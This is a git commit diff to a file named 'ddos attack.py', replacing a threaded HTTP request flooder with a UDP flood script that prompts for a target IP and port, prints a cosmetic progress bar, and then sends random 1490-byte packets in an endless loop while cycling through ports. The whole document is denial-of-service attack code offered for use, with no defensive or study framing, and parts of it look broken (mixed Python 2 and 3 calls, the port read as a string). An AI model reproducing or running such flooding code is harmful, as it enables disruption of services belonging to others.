bfc0f2b06a851d51ebe4f8e5228cdb4c6cd647ef
Rajat Jaiswal <125128631+Rajat223224@users.noreply.github.com>
2023-05-21 16:00:19 +0530

    Update ddos attack.py

--- ddos attack.py
+++ ddos attack.py
@@ -1,23 +1,46 @@
-import requests
-from multiprocessing.pool import ThreadPool
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
 
-def send_request(url):
-    try:
-        session = requests.Session()
-        response = session.get(url)
-        # You can handle the response here, such as checking the status code or content
-        print("Request sent successfully!")
-    except requests.exceptions.RequestException as e:
-        print(f"An error occurred: {str(e)}")
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
 
-def main():
-    url = input("Enter your URL => ")
-    num_packets = int(input("Enter the number of packets => "))
+os.system("clear")
+os.system("figlet DDos Attack")
+print
+print ("Author   : RatDenial")
+ip = raw_input("IP Target : ")
+port = input("Port       : ")
 
-    pool = ThreadPool()
-    pool.map(send_request, [url] * num_packets)
-    pool.close()
-    pool.join()
-
-# Run the main function
-main()
+os.system("clear")
+os.system("figlet Attack Starting")
+print ("[                    ] 0% ")
+time.sleep(5)
+print ("[=====               ] 25%")
+time.sleep(5)
+print ("[==========          ] 50%")
+time.sleep(5)
+print ("[===============     ] 75%")
+time.sleep(5)
+print ("[====================] 100%")
+time.sleep(3)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print ("Sent %s packet to %s throught port:%s")%(sent,ip,port)
+     if port == 65534:
+       port = 1
